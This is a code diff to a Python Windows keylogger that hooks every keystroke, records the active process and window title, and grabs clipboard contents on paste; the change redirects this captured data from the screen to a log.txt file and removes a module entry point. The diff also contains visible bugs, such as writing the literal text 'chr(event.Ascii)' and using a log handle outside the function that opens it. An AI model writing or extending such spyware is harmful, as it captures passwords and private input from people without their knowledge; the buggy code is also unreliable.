@@ -32,9 +32,12 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
     # print out the header if we're in the right process
-    print
-    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
-    print
+    
+    log = open('log.txt','w')
+
+    print >> log
+    print >> log , "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+    print >> log
   
 
     # close handles
@@ -52,7 +55,7 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
+        print >> log , 'chr(event.Ascii)',
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -60,9 +63,9 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            print "[PASTE] - %s" % (pasted_value),
+            print >> log , "[PASTE] - %s" % (pasted_value),
         else:
-            print "[%s]" % event.Key,
+            print >> log , "[%s]" % event.Key,
 
     # pass execution to next hook registered 
     return True
@@ -75,9 +78,3 @@ kl.KeyDown = KeyStroke
 # register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
-
-def run(**args):
-
-	print "[*] In keylogger module."
-	return str(sys.stdout)
-
